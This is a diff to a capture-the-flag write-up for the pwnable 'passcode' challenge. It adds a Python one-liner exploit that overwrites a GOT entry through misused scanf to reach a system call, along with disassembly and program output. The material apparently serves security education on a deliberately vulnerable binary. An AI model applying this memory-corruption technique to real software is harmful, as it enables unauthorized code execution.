@@ -54,8 +54,13 @@ uzi@pwnpatrol:$ objdump -Mintel -d passcode | grep -A 40 "<login>:"
  80485ea:       e8 71 fe ff ff          call   8048460 <system@plt>
  ...
 ```
-Along with the script, challange can be solved with a one-liner as well.
-
+Along with the script, challange can be solved with a one-liner as well. Of course, it needs to be exe
+```
+passcode@pwnable:~$ python3 -c 'import sys;sys.stdout.buffer.write(b"A"*96 + b"\x04\xa0\x04\x08" + b"134514147")' | ./passcode
+...
+Sorry mom.. I got confused about scanf usage :(
+...
+```
 
 
 
